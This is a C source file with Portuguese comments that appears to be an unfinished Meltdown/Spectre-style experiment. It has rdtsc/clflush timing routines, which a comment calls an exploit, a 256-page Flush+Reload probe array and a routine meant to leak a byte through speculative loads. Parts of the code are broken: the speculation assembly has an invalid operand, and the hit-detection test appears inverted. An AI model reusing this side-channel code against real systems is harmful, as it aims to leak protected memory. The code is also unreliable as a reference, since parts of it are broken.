#include <stdio.h>
#include <stdlib.h>

#define NUM_ITERACOES 1000
#define CACHE_LINE_LEN	128

unsigned GetDS(){
	unsigned ds;
	asm __volatile__(
			"mov %%DS , %0"
			: "=r"(ds) :
			);
	return ds;
}
void PrintLista(int lista[])
{
	printf("Possiveis valores: ");
	for (int i=0; lista[i]!=-1;i++)
	{
		printf(" %i",lista[i]);
	}
	printf("\n");
}

char p1[] = 	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";



int Probe(char *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%eax   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}

void Flush(char *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			: : "r" (addr)
			);
}





unsigned Treshold(unsigned iteracoes,char *base)
{

	unsigned i=0;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	Flush(base);
	while (i<iteracoes)
	{
		Flush(p1);
		totalComFlush+=Probe(base);
		totalSemFlush+=Probe(base);
		Flush(base);
		i++;
	}
	totalComFlush=totalComFlush/(i);
	totalSemFlush=totalSemFlush/(i);
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		

	return (totalComFlush+totalSemFlush)/2;

}

void speculate(unsigned long *array,void *base)
{

	asm __volatile__(
			"mov %0, %%rcx	\n"
			"mov %1, %%r9	\n"
			"mov $100,%%rsi	\n"
			"repeat:			\n" 
			"	mov $0,%%eax		\n"
			"	mov (%%rcx),%%rbx		\n"
			"	mov (%%rbx), %%al			\n"
			"	mov %%rbx,al(%%r9)		\n"
			"	dec %%rsi			\n"
			"	jnz repeat			\n"

			:  : "r" (array) ,"r" (base)
			);


}
void fillArray(unsigned long array[],unsigned long addr)
{
	for(int i=0;i<200;i++){
		array[i]=0;
	}
	array[101]=addr;
}


void FlushAll(void *base)
{
	void *inicio=base;
	for (int i=0; i <= 255 ; i++){
		
		Flush(inicio+i*4096);
	}
}

void FindSecretLineCache(void *base,unsigned treshold,int lista[])
{
	//printf("inicio do segmento=%p\n",base);
	unsigned x[256];
	for (int i=0; i <= 255 ; i++)
	{
		x[i]=Probe(base+i*4096);
	}
	int contador=0;
	for (int i=0; i <= 255 ; i++)
	{
		//printf("probe: add:%i - tempo- %i, treshold- %i\n",i,x[i],treshold);
		//printf("probe: add:%i - tempo- %i\n",i,x[i]);
		if (x[i] > treshold){
			lista[contador]=i;
			contador++;
		}

	}
	lista[contador]=-1;
}

int main(void)
{
	char *bufferFill=malloc(4096*4000)+0xFFFFF;
	unsigned treshold;
	int lista[256];
	bufferFill=(char *)((unsigned long)bufferFill & 0xFFFFFFFFFFF00000);

	treshold=Treshold(NUM_ITERACOES,bufferFill);
	printf("treshold=%08X\n",treshold);
	printf("DS register = %08X\n",GetDS());
	printf("p1=%p\n",bufferFill);
	
	
	FlushAll(bufferFill);
	
	*(bufferFill+10*4096)='A';
	
	FindSecretLineCache(bufferFill,treshold,lista);
	printf("aqui %i\n",lista[0]);
	PrintLista(lista);


}


















